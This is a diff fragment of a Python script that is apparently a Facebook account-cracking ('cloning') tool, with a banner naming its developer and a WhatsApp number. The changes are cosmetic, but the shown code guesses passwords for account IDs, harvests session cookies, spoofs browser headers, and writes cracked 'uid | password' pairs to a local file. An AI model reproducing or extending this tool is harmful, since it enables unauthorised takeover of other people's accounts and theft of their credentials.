@@ -283,7 +283,7 @@ logo=("""
 \x1b[38;5;85m██      ██ ██   ██ ██  █████  ██ ██████   ██████  ██   ████
 \x1b[38;5;77m──────────────────────────────────────────────                 
 \x1b[38;5;83m〘✧〙DEVLOPER  \x1b[38;5;222m➤  \x1b[38;5;85m MOHAMMAD JIBON ✧ 2024
-\x1b[38;5;83m〘✧〙FACEBOOK  \x1b[38;5;222m➤  \x1b[38;5;85m MOHAMMAD ZAHIRUL
+\x1b[38;5;83m〘✧〙FACEBOOK  \x1b[38;5;222m➤  \x1b[38;5;85m MOHAMMAD ZAHIRUL ✧ 2015
 \x1b[38;5;83m〘✧〙WHATSAPP  \x1b[38;5;222m➤   \x1b[38;5;85m+8801846738727 ✧ WH & BK
 \x1b[38;5;83m〘✧〙TOOLS     \x1b[38;5;222m➤   \x1b[38;5;85mFILE CLONING ✧ RANDOM CLONE
 \x1b[38;5;77m──────────────────────────────────────────────""")
@@ -501,8 +501,7 @@ def random_headers():
         "sec-fetch-site": 'same-origin',
         "sec-fetch-user": '?1',
         "upgrade-insecure-requests": '1',
-        "user-agent": user_agent
-    }
+        "user-agent": user_agent,}
     return header
 
 def random_header():
@@ -615,7 +614,7 @@ def c(uid,pwx,ln):
             	#botcp(uid,ps)
             	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
             	cid = coki[82:97]
-            	print('\33[1;30m(JIBON-Cp [✧] '+cid+ ' | ' +ps+'  |>>'+tahunng(cid))
+            	print('\033[1;92m(JIBON-OK [✧] '+cid+ ' | ' +ps+'  |>>'+tahunng(cid))
             	#print('\033[1;92m[\033[1;92mðŸª\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
             	open('JIBON-CP.txt', 'a').write( uid+' | '+ps+' \n')
             	cps.append(cid)
